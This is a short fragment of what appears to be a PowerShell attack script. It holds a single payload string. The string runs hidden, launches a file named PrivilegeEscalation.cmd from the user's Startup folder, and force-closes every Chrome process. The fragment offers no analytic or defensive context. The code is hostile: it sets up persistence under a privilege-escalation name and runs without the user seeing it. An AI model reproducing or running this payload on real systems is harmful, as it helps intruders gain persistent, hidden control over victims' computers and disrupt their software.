...
$Payload = 'powershell -WindowStyle Hidden -command "Start-Process -FilePath \"$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\PrivilegeEscalation.cmd\"; $chrome = Get-Process -name chrome; $chrome | ForEach-Object { Stop-Process -Name chrome -Force }"'
